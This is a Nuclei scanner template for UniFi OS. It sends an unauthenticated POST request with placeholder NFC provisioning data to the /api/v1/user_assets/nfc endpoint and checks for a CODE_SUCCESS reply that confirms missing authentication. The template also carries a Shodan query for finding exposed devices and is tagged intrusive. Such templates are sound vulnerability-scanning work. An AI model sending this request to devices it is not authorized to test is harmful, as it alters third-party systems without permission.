http:
- matchers:
  - condition: and
    dsl:
    - contains(body,"CODE_SUCCESS")
    - contains(content_type, "application/json")
    - status_code == 200
    type: dsl
  raw:
  - "@Host: {{Hostname}}:9780\nPOST /api/v1/user_assets/nfc HTTP/1.1\nHost: {{Hostname}}\n\
    Content-Type: application/json\n\n{\n  \"alias\": \"{{rand_string}}\",\n  \"asset_id\"\
    : \"1\",\n  \"need_provision\": true,\n  \"nfc_id\": \"1\",\n  \"plain_token\"\
    : \"1\",\n  \"sys_id\": \"1\",\n  \"token\": \"1\",\n  \"ua_card_id\": \"1\",\n\
    \  \"ua_card_pub_key\": \"1\"\n}\n"
id: unifi-create-user
info:
  author: DhiyaneshDk
  description: 'The /api/v1/user_assets/nfc endpoint accepts unauthenticated POST
    requests with NFC provisioning data (e.g., alias, asset_id, nfc_id, tokens) and
    returns {"code":"CODE_SUCCESS"} over HTTP, confirming backend processing without
    any authentication or session validation.

    '
  metadata:
    max-request: 1
    shodan-query: html:"UniFi Dream Machine SE"
    verified: true
  name: UniFi - Unauthenticated Creation Access For Users
  reference:
  - https://www.catchify.sa/post/cve-2025-52665-rce-in-unifi-os-25-000
  severity: high
  tags: unifi,unauth,vuln,intrusive
variables:
  rand_string: '{{to_lower(rand_text_alpha(6))}}'
